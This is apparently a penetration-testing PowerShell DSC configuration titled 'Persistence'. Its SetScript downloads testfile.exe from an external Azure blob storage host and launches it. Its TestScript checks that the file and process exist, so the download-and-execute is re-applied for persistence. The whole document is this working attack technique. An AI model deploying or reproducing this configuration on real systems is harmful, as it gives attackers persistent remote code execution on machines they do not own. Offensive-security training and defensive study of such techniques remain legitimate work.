Configuration Persistence
{
    Import-DscResource -ModuleName 'PSDesiredStateConfiguration'

    Node localhost
    {
        Script ScriptExample
        {
            SetScript = {
                wget https://azurepentesting.blob.core.windows.net/public/testfile.exe -OutFile c:\testfile.exe
				Start-Process C:\testfile.exe -NoNewWindow
            }
            TestScript = { 
				if(((Test-Path c:\testfile.exe) -eq $true) -and ((Get-Process | where ProcessName -eq testfile) -ne $null)){return $true}else{return $false}				
			}
            GetScript = { return @{result = 'result'} }
        }
    }
}